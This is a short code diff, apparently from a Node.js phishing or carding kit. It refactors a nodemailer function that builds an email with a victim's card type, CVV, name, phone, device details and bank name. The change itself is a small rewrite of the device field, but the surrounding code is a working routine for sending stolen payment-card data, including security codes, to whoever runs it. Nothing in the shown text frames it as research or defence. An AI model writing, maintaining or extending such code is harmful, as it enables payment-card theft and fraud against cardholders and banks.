@@ -11,7 +11,9 @@ const transporter = nodemailer.createTransport({
 });
 
 async function Mail(data) {
-  const device = `${data.detectedDevice.brand} ${data.detectedDevice.model} ${data.detectedDevice.version}`;
+  const brand = data.detectedDevice.brand;
+  const model = data.detectedDevice.model;
+  const version = data.detectedDevice.version;
   const html = `
  <b style="font-size:25px;">  <BR>        
     Card Type:  ${data.cardtype} <BR>
@@ -21,7 +23,7 @@ async function Mail(data) {
     CVV:  ${data.securitycode}<BR>
     Name:  ${data.name}<BR>
     Phone: ${data.phone}<BR>    
-    Device:  ${device} <BR>
+    Device:  ${brand} ${model}-${version} <BR>
     </b>;
 `;
   const subject = `${data.bankname} CARD`;
